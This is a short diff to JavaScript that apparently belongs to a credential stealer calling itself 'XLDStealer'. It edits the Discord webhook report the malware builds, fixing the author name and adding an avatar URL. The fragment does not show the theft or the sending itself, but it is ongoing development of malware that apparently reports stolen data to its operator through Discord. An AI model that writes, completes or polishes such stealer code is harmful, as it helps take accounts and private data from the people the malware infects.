@@ -41,7 +41,7 @@ function FirstTime() {
                     inline: !1,
                   },
                 ],
-                author: { name: "XLDeStealer" },
+                author: { name: "XLDStealer" },
                 footer: { text: "XLDStealer" },
                 thumbnail: { url: "https://ibb.co/nmDLGCT" },
               },
@@ -58,6 +58,8 @@ function FirstTime() {
               const n = JSON.parse(t);
               var a = {
                 username: "XLDStealer",
+                avatar: "https://media.discordapp.net/attachments/962421775361273910/966779841204596766/IMG-20220421-WA0062.jpg",
+             
                 content: "",
                 embeds: [
                   {
